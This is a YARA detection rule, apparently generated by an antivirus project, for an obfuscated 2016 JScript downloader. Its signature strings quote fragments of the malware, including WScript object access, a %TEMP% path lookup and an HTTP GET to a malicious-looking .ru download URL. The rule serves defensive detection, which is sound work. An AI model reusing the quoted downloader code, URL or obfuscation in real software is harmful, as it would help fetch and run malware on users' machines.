rule sig_20160428_2bd3a36783841a65d56b551fada8d899 {
  meta:
    description = "datamaliciousorder - file 20160428_2bd3a36783841a65d56b551fada8d899.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ebd3441c354346f0e9ab10dd06851273ed632d0c4ac22fcd1b7724fe66b36da1"

  strings:
    $s1  = "function LagRzoXkfYiyJqqBijMyc(HpzCptFdkFogReuBtaKwt){EbvPdeKldZcgBdmPnrJgj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function LagRzoXkfYiyJqqBijMyc(HpzCptFdkFogReuBtaKwt){EbvPdeKldZcgBdmPnrJgj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QjyYxmPivZaqLdhLmqPnz() {return EbvPdeKldZcgBdmPnrJgj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function EekYcrVjqIzoOryRzpTbc(FhiIxbJxyGjiCnxQjoXsz, AoxFmiBcsWezBtzWppPfm){HamDorZfjBrhMihIjtTza = HamDorZfjBrhMihIjtTza * 1; " ascii
    $s5  = "return FhiIxbJxyGjiCnxQjoXsz - AoxFmiBcsWezBtzWppPfm;};" fullword ascii
    $s6  = "var EbvPdeKldZcgBdmPnrJgj = function HtdJhjMjcSgmKlsIouChj() {return DorNinQzkIimDboSnrKif[PjsYpaFfoQagVerDqkQuj](\"WScript\"+\"" ascii
    $s7  = "PwiXncKhmLsxXdyUksGuf[KerIbqQlaIlfOtgFuyOgb](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var EbvPdeKldZcgBdmPnrJgj = function HtdJhjMjcSgmKlsIouChj() {return DorNinQzkIimDboSnrKif[PjsYpaFfoQagVerDqkQuj](\"WScript\"+\"" ascii
    $s9  = "var DorNinQzkIimDboSnrKif = this[\"WScript\"];" fullword ascii
    $s10 = "function QjyYxmPivZaqLdhLmqPnz() {return EbvPdeKldZcgBdmPnrJgj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function NehZkkMmfEdnYhuBylBlx(){return CuoSdiZkaOkjUqvBfbWqz + \"\";};" fullword ascii
    $s12 = "if (PwiXncKhmLsxXdyUksGuf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function EekYcrVjqIzoOryRzpTbc(FhiIxbJxyGjiCnxQjoXsz, AoxFmiBcsWezBtzWppPfm){HamDorZfjBrhMihIjtTza = HamDorZfjBrhMihIjtTza * 1; " ascii
    $s14 = "function XimBlpPqgVsrUmiTwkHad() {return ((DgbLkdCflZeiEshEgpHhx == true) && (DgbLkdCflZeiEshEgpHhx == TskFzoBieSkiNryNasDzz)) ?" ascii
    $s15 = "function XimBlpPqgVsrUmiTwkHad() {return ((DgbLkdCflZeiEshEgpHhx == true) && (DgbLkdCflZeiEshEgpHhx == TskFzoBieSkiNryNasDzz)) ?" ascii
    $s16 = "var DgbLkdCflZeiEshEgpHhx = false;" fullword ascii
    $s17 = "}while (YjjTyoSntZyhOhoMnqEhj);" fullword ascii
    $s18 = "var PrhJpfXzdPodCfqKonHjp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "DgbLkdCflZeiEshEgpHhx = true; " fullword ascii
    $s20 = "JfqYhkTtbSjzJgtJbmQcm = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}